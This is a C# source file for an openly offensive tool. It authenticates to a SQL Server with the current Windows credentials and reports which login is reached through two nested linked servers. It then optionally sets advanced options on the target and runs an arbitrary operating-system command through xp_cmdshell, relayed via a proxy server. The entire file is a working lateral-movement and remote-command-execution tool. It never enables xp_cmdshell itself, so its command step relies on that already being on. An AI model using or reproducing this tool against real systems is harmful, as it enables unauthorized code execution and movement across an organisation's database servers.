using System;
using System.Data.SqlClient;

// Execute through a nested linked sql server
// If you don't specify a command, the executable will just test the connection and enumerate the login
// Usage: sqlNestedExec.exe -h <initialLogonServer> -t <targetServer> -p <proxyServer> [-c <command>]

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "";
            String database = "master";
            String target = "";
            String proxy = "";
            String cmd = "";

            for (var i = 0; i < args.Length; i++)
            {
                if (args[i] == "-h") { sqlServer = args[i + 1]; }
                else if (args[i] == "-d") { database = args[i + 1]; }
                else if (args[i] == "-t") { target = args[i + 1]; }
                else if (args[i] == "-p") { proxy = args[i + 1]; }
                else if (args[i] == "-c") { cmd = args[i + 1]; }
            }

            if (sqlServer == "")
            {
                Console.WriteLine("Please specify a host with -h <host>");
                Environment.Exit(0);
            }

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            if (target == "" || proxy == "")
            {
                Console.WriteLine("Usage: sqlLink.exe -h <initialLogonServer> -t <targetServer> -p <proxyServer>");
                Environment.Exit(0);
            }
            String execCmd = "select mylogin from openquery(\"" + proxy + "\", 'select mylogin from openquery(\"" + target + "\", ''select SYSTEM_USER as mylogin'')')";

            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read())
            {
                Console.WriteLine("New User Running from " + sqlServer + " -> " + proxy + " -> " + target + ": " + reader[0]);
            }
            reader.Close();

            if (cmd != "")
            {
                Console.WriteLine("Attempting to execute " + cmd + " on " + target);
                String enable_xp = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT \"" + target + "\"') AT \"" + proxy + "\"";
                command = new SqlCommand(enable_xp, con);
                reader = command.ExecuteReader();
                reader.Close();

                String exec = "EXEC ('EXEC (''xp_cmdshell ''''" + cmd + "'''''') AT \"" + target + "\"') AT \"" + proxy + "\"";
                //"select * from openquery(" + target + ",select * from openquery("+proxy+",'EXEC xp_cmdshell ''" + cmd + "'' WITH RESULT SETS ((output VARCHAR(MAX)))'))";
                command = new SqlCommand(exec, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Result of command is: ");
                Console.WriteLine(reader[0]);
                if (reader.HasRows)
                {
                    int count = reader.FieldCount;
                    while (reader.Read())
                    {

                        for (int i = 0; i < count; i++)
                        {
                            Console.WriteLine(reader.GetValue(i));
                        }
                    }
                }
                reader.Close();
            }

            con.Close();
        }
    }
}